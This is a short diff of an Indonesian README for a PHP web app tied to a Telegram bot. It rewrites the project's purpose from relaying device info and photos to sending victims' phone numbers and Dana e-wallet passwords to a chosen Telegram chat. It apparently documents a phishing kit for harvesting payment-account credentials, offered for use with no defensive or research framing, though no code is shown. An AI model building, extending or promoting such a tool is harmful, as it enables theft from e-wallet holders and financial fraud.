@@ -1,5 +1,5 @@
 # 📦 Proyek Web PHP + Bot Telegram
-Proyek ini adalah aplikasi web sederhana menggunakan PHP yang dapat mengirimkan data (Informasi perangkat & file foto) ke Bot Telegram dan meneruskannya ke CHAT_ID yang ditentukan.
+Proyek ini adalah aplikasi web sederhana menggunakan PHP yang dapat mengirimkan data (Informasi perangkat, nomor, dan kata sandi Dana) ke Bot Telegram dan meneruskannya ke CHAT_ID yang ditentukan.
 
 ## 🔧 Kebutuhan
 * Akun Telegram
@@ -8,7 +8,7 @@ Proyek ini adalah aplikasi web sederhana menggunakan PHP yang dapat mengirimkan 
 
 ## 🛠️ Fitur
 * Web berbasis PHP
-* Mengirim data (teks, gambar, dll.) ke Bot Telegram
+* Mengirim data (teks, nomor, dan sandi.) ke Bot Telegram
 * Data diteruskan ke chat tertentu melalui CHAT_ID
 
 
